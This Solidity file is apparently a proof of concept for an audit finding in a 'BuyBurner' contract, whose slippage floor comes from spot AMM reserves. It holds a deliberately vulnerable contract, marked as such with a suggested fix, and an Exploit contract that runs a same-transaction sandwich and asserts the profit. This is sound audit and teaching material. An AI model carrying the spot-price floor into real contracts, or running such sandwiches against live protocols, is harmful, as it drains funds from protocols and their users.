// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  BuyBurner — H-01 (Pashov, 2024-12-14)
    _getTokenAmountPrice sets the slippage floor from Uniswap V2 getAmountsOut,
    which is the spot reserves. A same-transaction sandwich moves those reserves
    first, so the floor falls with the manipulation and the protocol buys dust
    BEAM. The getAmountsOut call site is the audited line.
*/

contract MockToken {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 a) external {
        balanceOf[to] += a;
    }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        return true;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }

    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a;
        balanceOf[t] += a;
        return true;
    }
}

contract Pair {
    MockToken public token0;
    MockToken public token1;

    constructor(MockToken _token0, MockToken _token1) {
        token0 = _token0;
        token1 = _token1;
    }

    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) public pure returns (uint256) {
        return reserveOut * amountIn / (reserveIn + amountIn);
    }

    function swap(address tokenIn, uint256 amountIn, address to) external returns (uint256 amountOut) {
        MockToken tin = MockToken(tokenIn);
        MockToken tout = tokenIn == address(token0) ? token1 : token0;
        uint256 reserveIn = tin.balanceOf(address(this));
        uint256 reserveOut = tout.balanceOf(address(this));
        amountOut = getAmountOut(amountIn, reserveIn, reserveOut); // @beat:out
        tin.transferFrom(msg.sender, address(this), amountIn);
        tout.transfer(to, amountOut);
    }
}

contract Router {
    Pair public pair;

    constructor(Pair _pair) {
        pair = _pair;
    }

    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts) {
        amounts = new uint256[](path.length);
        amounts[0] = amountIn;
        for (uint256 i = 0; i < path.length - 1; i++) {
            (uint256 reserveIn, uint256 reserveOut) = _reserves(path[i], path[i + 1]);
            amounts[i + 1] = pair.getAmountOut(amountIn, reserveIn, reserveOut);
            amountIn = amounts[i + 1];
        }
    }

    function _reserves(address a, address b) internal view returns (uint256 reserveIn, uint256 reserveOut) {
        MockToken ta = MockToken(a);
        MockToken tb = MockToken(b);
        reserveIn = ta.balanceOf(address(pair));
        reserveOut = tb.balanceOf(address(pair));
    }
}

contract BuyBurner {
    Router public router;
    Pair public pair;
    MockToken public weth;
    MockToken public beam;
    uint256 public slippageBps = 100; // 1%, a fixed percent, not an absolute BEAM amount

    constructor(Router _router, Pair _pair, MockToken _weth, MockToken _beam) {
        router = _router;
        pair = _pair;
        weth = _weth;
        beam = _beam;
    }

    function _getTokenAmountPrice(uint256 tokenAmount, address token0, address token1) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1;
        uint256[] memory returnedParam = router.getAmountsOut(tokenAmount, path); // @> VULN: spot reserves set the floor
        // FIX: take amountOutMin from the caller, or quote a TWAP / Chainlink price.
        return returnedParam[1];
    }

    function _getAmountOutMin(uint256 amountIn) public view returns (uint256) {
        uint256 quoted = _getTokenAmountPrice(amountIn, address(weth), address(beam));
        return quoted * (10000 - slippageBps) / 10000; // @beat:min
    }

    function buy(uint256 amountIn) external {
        uint256 minOut = _getAmountOutMin(amountIn);
        weth.approve(address(pair), amountIn);
        uint256 outAmt = pair.swap(address(weth), amountIn, address(this));
        require(outAmt >= minOut, "slippage");
    }
}

contract Exploit {
    MockToken public weth;
    MockToken public beam;
    Pair public pair;
    Router public router;
    BuyBurner public burner;
    uint256 public profit;
    uint256 public protocolBeam;
    uint256 public constant START = 10000 ether;
    uint256 public constant SPEND = 100 ether;

    constructor() {
        weth = new MockToken("WETH"); // nonce 1
        beam = new MockToken("BEAM"); // nonce 2
        pair = new Pair(weth, beam); // nonce 3
        router = new Router(pair); // nonce 4
        burner = new BuyBurner(router, pair, weth, beam); // nonce 5
        weth.mint(address(pair), 1000 ether);
        beam.mint(address(pair), 1000 ether);
        weth.mint(address(this), START);
        weth.mint(address(burner), SPEND);
    }

    function run() external {
        uint256 beforeBal = weth.balanceOf(address(this));
        weth.approve(address(pair), START);
        pair.swap(address(weth), START, address(this)); // @beat:skew
        burner.buy(SPEND); // @beat:buy
        beam.approve(address(pair), beam.balanceOf(address(this)));
        pair.swap(address(beam), beam.balanceOf(address(this)), address(this)); // @beat:unsandwich
        profit = weth.balanceOf(address(this)) - beforeBal; // @beat:profit
        protocolBeam = beam.balanceOf(address(burner));
        require(protocolBeam < 1 ether, "protocol received almost no BEAM");
        require(profit == 99180327868852459007, "sandwich profit");
        require(weth.balanceOf(address(burner)) == 0, "protocol spent its WETH");
    }
}
